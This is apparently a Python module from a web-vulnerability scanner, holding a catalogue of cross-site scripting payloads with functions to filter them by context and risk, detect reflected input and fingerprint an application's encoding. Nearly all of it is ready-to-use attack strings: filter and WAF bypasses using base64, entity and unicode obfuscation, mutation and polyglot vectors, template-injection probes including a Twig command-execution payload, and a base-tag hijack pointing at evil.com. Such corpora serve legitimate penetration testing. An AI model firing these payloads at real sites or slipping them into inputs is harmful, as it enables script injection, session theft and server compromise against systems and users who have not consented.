"""
XSS payload corpus — XSStrike / PayloadsAllTheThings / PortSwigger class.

Contexts: html, attr, js, js_string, url, svg, math, template, polyglot, dom, angular, vue, react
Risk 1 = safe canary, 2 = common exploit, 3 = advanced/filter-bypass
"""

from __future__ import annotations

from typing import Any

# ---------------------------------------------------------------------------
# Canonical payload table
# ---------------------------------------------------------------------------

_PAYLOADS: list[dict[str, Any]] = [
    # --- HTML body / tag injection (risk 1-2) ---
    {"id": "H01", "vector": "<script>alert(1)</script>", "context": "html", "risk": 1, "tags": ["script"]},
    {"id": "H02", "vector": "<script>alert(String.fromCharCode(88,83,83))</script>", "context": "html", "risk": 1, "tags": ["script"]},
    {"id": "H03", "vector": "<script src=data:text/javascript,alert(1)></script>", "context": "html", "risk": 2, "tags": ["script", "data-uri"]},
    {"id": "H04", "vector": "<img src=x onerror=alert(1)>", "context": "html", "risk": 1, "tags": ["event"]},
    {"id": "H05", "vector": "<img src=x onerror=alert`1`>", "context": "html", "risk": 2, "tags": ["event", "template-literal"]},
    {"id": "H06", "vector": "<svg onload=alert(1)>", "context": "html", "risk": 1, "tags": ["svg", "event"]},
    {"id": "H07", "vector": "<svg/onload=alert(1)>", "context": "html", "risk": 2, "tags": ["svg", "slash"]},
    {"id": "H08", "vector": "<body onload=alert(1)>", "context": "html", "risk": 1, "tags": ["event"]},
    {"id": "H09", "vector": "<iframe src=javascript:alert(1)>", "context": "html", "risk": 2, "tags": ["iframe", "js-uri"]},
    {"id": "H10", "vector": "<iframe srcdoc='<script>alert(1)</script>'>", "context": "html", "risk": 2, "tags": ["iframe", "srcdoc"]},
    {"id": "H11", "vector": "<details open ontoggle=alert(1)>", "context": "html", "risk": 1, "tags": ["event"]},
    {"id": "H12", "vector": "<marquee onstart=alert(1)>", "context": "html", "risk": 2, "tags": ["event"]},
    {"id": "H13", "vector": "<video><source onerror=alert(1)>", "context": "html", "risk": 1, "tags": ["event"]},
    {"id": "H14", "vector": "<audio src=x onerror=alert(1)>", "context": "html", "risk": 1, "tags": ["event"]},
    {"id": "H15", "vector": "<input autofocus onfocus=alert(1)>", "context": "html", "risk": 1, "tags": ["event", "autofocus"]},
    {"id": "H16", "vector": "<select onfocus=alert(1) autofocus>", "context": "html", "risk": 1, "tags": ["event"]},
    {"id": "H17", "vector": "<textarea onfocus=alert(1) autofocus>", "context": "html", "risk": 1, "tags": ["event"]},
    {"id": "H18", "vector": "<keygen autofocus onfocus=alert(1)>", "context": "html", "risk": 2, "tags": ["event"]},
    {"id": "H19", "vector": "<math><mtext></math><img src=x onerror=alert(1)>", "context": "html", "risk": 2, "tags": ["math", "mutation"]},
    {"id": "H20", "vector": "<object data=javascript:alert(1)>", "context": "html", "risk": 2, "tags": ["object", "js-uri"]},
    {"id": "H21", "vector": "<embed src=javascript:alert(1)>", "context": "html", "risk": 2, "tags": ["embed"]},
    {"id": "H22", "vector": "<form><button formaction=javascript:alert(1)>X", "context": "html", "risk": 2, "tags": ["form"]},
    {"id": "H23", "vector": "<isindex action=javascript:alert(1) type=submit>", "context": "html", "risk": 3, "tags": ["legacy"]},
    {"id": "H24", "vector": "<table background=javascript:alert(1)>", "context": "html", "risk": 3, "tags": ["legacy"]},
    {"id": "H25", "vector": "<a href=javascript:alert(1)>click</a>", "context": "html", "risk": 1, "tags": ["js-uri"]},
    {"id": "H26", "vector": "<a href=\"javascript:alert(1)\">click</a>", "context": "html", "risk": 1, "tags": ["js-uri"]},
    {"id": "H27", "vector": "<div onmouseover=alert(1)>X</div>", "context": "html", "risk": 1, "tags": ["event"]},
    {"id": "H28", "vector": "<div style=\"background:url('javascript:alert(1)')\">", "context": "html", "risk": 3, "tags": ["css", "legacy"]},
    {"id": "H29", "vector": "<link rel=stylesheet href=javascript:alert(1)>", "context": "html", "risk": 3, "tags": ["link"]},
    {"id": "H30", "vector": "<base href=javascript://x%0aalert(1)>", "context": "html", "risk": 3, "tags": ["base"]},

    # --- Filter / WAF bypass (risk 2-3) ---
    {"id": "B01", "vector": "<scr<script>ipt>alert(1)</scr</script>ipt>", "context": "html", "risk": 2, "tags": ["bypass", "nested"]},
    {"id": "B02", "vector": "<img src=x oneonerrorrror=alert(1)>", "context": "html", "risk": 2, "tags": ["bypass", "double"]},
    {"id": "B03", "vector": "<svg><script>alert&#40;1&#41;</script>", "context": "html", "risk": 2, "tags": ["bypass", "entity"]},
    {"id": "B04", "vector": "<img src=x onerror=\\u0061lert(1)>", "context": "html", "risk": 2, "tags": ["bypass", "unicode"]},
    {"id": "B05", "vector": "<<SCRIPT>alert(1)//<</SCRIPT>", "context": "html", "risk": 2, "tags": ["bypass"]},
    {"id": "B06", "vector": "<IMG SRC=JaVaScRiPt:alert(1)>", "context": "html", "risk": 2, "tags": ["bypass", "case"]},
    {"id": "B07", "vector": "<img src=x onerror=alert(1)//", "context": "html", "risk": 2, "tags": ["bypass"]},
    {"id": "B08", "vector": "<svg onload=alert(1)//", "context": "html", "risk": 2, "tags": ["bypass"]},
    {"id": "B09", "vector": "<img src=\"x\" onerror=\"alert(1)\">", "context": "html", "risk": 1, "tags": ["quoted"]},
    {"id": "B10", "vector": "<img src='x' onerror='alert(1)'>", "context": "html", "risk": 1, "tags": ["quoted"]},
    {"id": "B11", "vector": "<img/src=x/onerror=alert(1)>", "context": "html", "risk": 2, "tags": ["slash"]},
    {"id": "B12", "vector": "<img src=x onerror=alert(String.fromCharCode(49))>", "context": "html", "risk": 2, "tags": ["bypass"]},
    {"id": "B13", "vector": "<script>eval(atob('YWxlcnQoMSk='))</script>", "context": "html", "risk": 2, "tags": ["bypass", "base64"]},
    {"id": "B14", "vector": "<script>window['al'+'ert'](1)</script>", "context": "html", "risk": 2, "tags": ["bypass", "concat"]},
    {"id": "B15", "vector": "<script>top[/al/.source+/ert/.source](1)</script>", "context": "html", "risk": 3, "tags": ["bypass"]},
    {"id": "B16", "vector": "<script>\\u0061lert(1)</script>", "context": "html", "risk": 2, "tags": ["unicode"]},
    {"id": "B17", "vector": "<script>\\x61lert(1)</script>", "context": "html", "risk": 2, "tags": ["hex"]},
    {"id": "B18", "vector": "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>", "context": "html", "risk": 3, "tags": ["bypass"]},
    {"id": "B19", "vector": "\"><script>alert(1)</script>", "context": "html", "risk": 1, "tags": ["breakout"]},
    {"id": "B20", "vector": "'><script>alert(1)</script>", "context": "html", "risk": 1, "tags": ["breakout"]},
    {"id": "B21", "vector": "</script><script>alert(1)</script>", "context": "html", "risk": 1, "tags": ["breakout"]},
    {"id": "B22", "vector": "</title><script>alert(1)</script>", "context": "html", "risk": 1, "tags": ["breakout"]},
    {"id": "B23", "vector": "\" onmouseover=alert(1) x=\"", "context": "attr", "risk": 1, "tags": ["attr-break"]},
    {"id": "B24", "vector": "' onmouseover=alert(1) x='", "context": "attr", "risk": 1, "tags": ["attr-break"]},
    {"id": "B25", "vector": "\" autofocus onfocus=alert(1) x=\"", "context": "attr", "risk": 1, "tags": ["attr-break"]},
    {"id": "B26", "vector": "' autofocus onfocus=alert(1) x='", "context": "attr", "risk": 1, "tags": ["attr-break"]},
    {"id": "B27", "vector": "\"><img src=x onerror=alert(1)>", "context": "attr", "risk": 1, "tags": ["attr-break"]},
    {"id": "B28", "vector": "javascript:alert(1)", "context": "url", "risk": 1, "tags": ["js-uri"]},
    {"id": "B29", "vector": "javascript:alert(1)//", "context": "url", "risk": 1, "tags": ["js-uri"]},
    {"id": "B30", "vector": "JaVaScRiPt:alert(1)", "context": "url", "risk": 2, "tags": ["js-uri", "case"]},
    {"id": "B31", "vector": "javascript&#58;alert(1)", "context": "url", "risk": 2, "tags": ["js-uri", "entity"]},
    {"id": "B32", "vector": "javascript&#x3a;alert(1)", "context": "url", "risk": 2, "tags": ["js-uri", "entity"]},
    {"id": "B33", "vector": "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)", "context": "url", "risk": 3, "tags": ["entity"]},
    {"id": "B34", "vector": "data:text/html,<script>alert(1)</script>", "context": "url", "risk": 2, "tags": ["data-uri"]},
    {"id": "B35", "vector": "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", "context": "url", "risk": 2, "tags": ["data-uri"]},

    # --- SVG / MathML ---
    {"id": "S01", "vector": "<svg><script>alert(1)</script></svg>", "context": "svg", "risk": 1, "tags": ["svg"]},
    {"id": "S02", "vector": "<svg><animatetransform onbegin=alert(1)>", "context": "svg", "risk": 2, "tags": ["svg"]},
    {"id": "S03", "vector": "<svg><set onbegin=alert(1)>", "context": "svg", "risk": 2, "tags": ["svg"]},
    {"id": "S04", "vector": "<svg><foreignObject><body xmlns=\"http://www.w3.org/1999/xhtml\" onload=alert(1)>", "context": "svg", "risk": 3, "tags": ["svg"]},
    {"id": "S05", "vector": "<math href=\"javascript:alert(1)\">X</math>", "context": "math", "risk": 2, "tags": ["math"]},
    {"id": "S06", "vector": "<svg><a xmlns:xlink=\"http://www.w3.org/1999/xlink\" xlink:href=\"javascript:alert(1)\"><rect width=100 height=100 /></a>", "context": "svg", "risk": 3, "tags": ["svg", "xlink"]},

    # --- JS context ---
    {"id": "J01", "vector": "';alert(1);//", "context": "js", "risk": 1, "tags": ["js"]},
    {"id": "J02", "vector": "';alert(1);//", "context": "js", "risk": 1, "tags": ["js"]},
    {"id": "J03", "vector": "</script><script>alert(1)</script>", "context": "js", "risk": 1, "tags": ["js", "breakout"]},
    {"id": "J04", "vector": "\\';alert(1);//", "context": "js_string", "risk": 2, "tags": ["js", "escape"]},
    {"id": "J05", "vector": "\\';alert(1);//", "context": "js_string", "risk": 2, "tags": ["js", "escape"]},
    {"id": "J06", "vector": "-alert(1)-", "context": "js", "risk": 1, "tags": ["js"]},
    {"id": "J07", "vector": "'-alert(1)-'", "context": "js_string", "risk": 1, "tags": ["js"]},
    {"id": "J08", "vector": "\"-alert(1)-\"", "context": "js_string", "risk": 1, "tags": ["js"]},
    {"id": "J09", "vector": "${alert(1)}", "context": "js_string", "risk": 2, "tags": ["template-literal"]},
    {"id": "J10", "vector": "`${alert(1)}`", "context": "js_string", "risk": 2, "tags": ["template-literal"]},

    # --- Template engines / frameworks ---
    {"id": "T01", "vector": "{{7*7}}", "context": "template", "risk": 1, "tags": ["ssti", "jinja", "twig"]},
    {"id": "T02", "vector": "${7*7}", "context": "template", "risk": 1, "tags": ["ssti", "freemarker"]},
    {"id": "T03", "vector": "#{7*7}", "context": "template", "risk": 1, "tags": ["ssti", "ognl"]},
    {"id": "T04", "vector": "{{constructor.constructor('alert(1)')()}}", "context": "template", "risk": 2, "tags": ["angular", "ssti"]},
    {"id": "T05", "vector": "{{$on.constructor('alert(1)')()}}", "context": "template", "risk": 2, "tags": ["angular"]},
    {"id": "T06", "vector": "{{constructor.constructor('alert(1)')()}}", "context": "angular", "risk": 2, "tags": ["angular"]},
    {"id": "T07", "vector": "{{x.constructor.constructor('alert(1)')()}}", "context": "angular", "risk": 2, "tags": ["angular"]},
    {"id": "T08", "vector": "[[7*7]]", "context": "template", "risk": 1, "tags": ["angularjs"]},
    {"id": "T09", "vector": "{{constructor['constructor']('alert(1)')()}}", "context": "template", "risk": 2, "tags": ["vue", "angular"]},
    {"id": "T10", "vector": "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", "context": "template", "risk": 3, "tags": ["twig"]},

    # --- DOM / hash ---
    {"id": "D01", "vector": "#<img src=x onerror=alert(1)>", "context": "dom", "risk": 1, "tags": ["dom", "hash"]},
    {"id": "D02", "vector": "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>", "context": "polyglot", "risk": 3, "tags": ["polyglot"]},
    {"id": "D03", "vector": "'\"--></style></script><svg onload=alert(1)>", "context": "polyglot", "risk": 2, "tags": ["polyglot"]},
    {"id": "D04", "vector": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e", "context": "polyglot", "risk": 3, "tags": ["polyglot"]},
    {"id": "D05", "vector": "\"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudChzY3JpcHQpO2EuZGF0YT1hbGVydCgxKTtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEp onerror=eval(atob(this.id))>", "context": "html", "risk": 3, "tags": ["bypass", "base64"]},

    # --- Mutation XSS ---
    {"id": "M01", "vector": "<noscript><p title=\"</noscript><img src=x onerror=alert(1)\">", "context": "html", "risk": 3, "tags": ["mutation"]},
    {"id": "M02", "vector": "<listing>&lt;img src=x onerror=alert(1)&gt;</listing>", "context": "html", "risk": 3, "tags": ["mutation"]},
    {"id": "M03", "vector": "<style><style/><img src=x onerror=alert(1)>", "context": "html", "risk": 3, "tags": ["mutation"]},
    {"id": "M04", "vector": "<img title=\"</img><img src onerror=alert(1)>\">", "context": "html", "risk": 2, "tags": ["mutation"]},
    {"id": "M05", "vector": "<div id=\"x\"></div><script>x.innerHTML='<img src=x onerror=alert(1)>'</script>", "context": "dom", "risk": 2, "tags": ["dom"]},

    # --- CSP / strict context probes ---
    {"id": "C01", "vector": "<script nonce=x>alert(1)</script>", "context": "html", "risk": 2, "tags": ["csp"]},
    {"id": "C02", "vector": "<img src=x onerror=alert(1) nonce=x>", "context": "html", "risk": 2, "tags": ["csp"]},
    {"id": "C03", "vector": "<base href=//evil.com/>", "context": "html", "risk": 2, "tags": ["csp", "base"]},
]

# Reflection canaries for encoding detection
_CANARIES = [
    "psecxsscan",
    "PSEC\"'<>",
    "psec<script>",
    "psec{{7*7}}",
]


def list_payloads(
    context: str = "",
    risk: int = 3,
    tags: str = "",
    max_items: int = 0,
) -> dict[str, Any]:
    """
    context: html|attr|js|js_string|url|svg|math|template|polyglot|dom|angular|vue|react| (empty=all)
    risk: max risk level to include (1-3)
    tags: comma-separated tag filter (any match)
    """
    want_tags = {t.strip().lower() for t in tags.split(",") if t.strip()} if tags else set()
    ctx = (context or "").strip().lower()
    out = []
    for p in _PAYLOADS:
        if p["risk"] > int(risk):
            continue
        if ctx and p["context"] != ctx and ctx not in (p.get("tags") or []):
            # allow context filter against tags loosely
            if p["context"] != ctx:
                continue
        if want_tags and not want_tags.intersection(set(p.get("tags") or [])):
            continue
        out.append(p)
    if max_items and max_items > 0:
        out = out[: int(max_items)]
    return {
        "total": len(out),
        "corpus_total": len(_PAYLOADS),
        "payloads": out,
        "contexts": sorted({p["context"] for p in _PAYLOADS}),
        "tags": sorted({t for p in _PAYLOADS for t in (p.get("tags") or [])}),
    }


def detect_reflection(body: str, vector: str) -> bool:
    if not body or not vector:
        return False
    if vector in body:
        return True
    # common encodings
    variants = [
        vector.replace("<", "&lt;").replace(">", "&gt;"),
        vector.replace('"', "&quot;").replace("'", "&#39;"),
        vector.replace("<", "\\u003c").replace(">", "\\u003e"),
        vector.replace("<", "\\x3c"),
    ]
    return any(v in body for v in variants if v != vector)


def encoding_fingerprint(body: str, canary: str = "PSEC\"'<>") -> dict[str, Any]:
    """Detect how the app encodes special characters (helps choose payloads)."""
    findings = []
    checks = [
        ("raw_quote", '"'),
        ("raw_apos", "'"),
        ("raw_lt", "<"),
        ("raw_gt", ">"),
        ("entity_lt", "&lt;"),
        ("entity_gt", "&gt;"),
        ("entity_quot", "&quot;"),
        ("entity_apos", "&#39;"),
        ("entity_apos2", "&#x27;"),
        ("backslash_quote", '\\"'),
        ("unicode_lt", "\\u003c"),
    ]
    for name, token in checks:
        if token in body:
            findings.append(name)
    return {"canary": canary, "signals": findings, "body_has_canary_fragment": any(c in body for c in "PSEC")}


def canaries() -> list[str]:
    return list(_CANARIES)
